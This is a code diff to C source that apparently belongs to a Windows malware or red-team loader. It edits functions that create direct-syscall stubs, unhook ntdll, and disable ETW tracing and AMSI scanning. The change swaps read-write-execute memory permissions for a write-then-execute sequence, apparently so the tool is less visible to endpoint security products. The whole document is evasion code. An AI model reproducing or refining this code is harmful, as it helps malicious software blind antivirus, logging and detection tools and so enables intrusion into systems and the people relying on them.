@@ -62,9 +62,11 @@ static void* create_syscall_stub(DWORD syscall_num) {
     /* Patch syscall number */
     memcpy(stub + 4, &syscall_num, 4);
     
-    void *mem = VirtualAlloc(NULL, sizeof(stub), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    void *mem = VirtualAlloc(NULL, sizeof(stub), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!mem) return NULL;
     memcpy(mem, stub, sizeof(stub));
+    DWORD oldProtect;
+    VirtualProtect(mem, sizeof(stub), PAGE_EXECUTE_READ, &oldProtect);
     return mem;
 }
 
@@ -146,7 +148,7 @@ void obf_unhook_ntdll(void) {
             SIZE_T size = section[i].SizeOfRawData;
             
             DWORD oldProtect;
-            VirtualProtect(memBase, size, PAGE_EXECUTE_READWRITE, &oldProtect);
+            VirtualProtect(memBase, size, PAGE_READWRITE, &oldProtect);
             memcpy(memBase, fileBase, size);
             VirtualProtect(memBase, size, oldProtect, &oldProtect);
             break;
@@ -235,7 +237,7 @@ void obf_bypass_etw_syscall(void) {
         GetCurrentProcess(),
         &addr,
         &size,
-        PAGE_EXECUTE_READWRITE,
+        PAGE_READWRITE,
         &oldProtect
     );
     
@@ -270,7 +272,7 @@ void obf_bypass_amsi_syscall(void) {
         GetCurrentProcess(),
         &addr,
         &size,
-        PAGE_EXECUTE_READWRITE,
+        PAGE_READWRITE,
         &oldProtect
     );
     
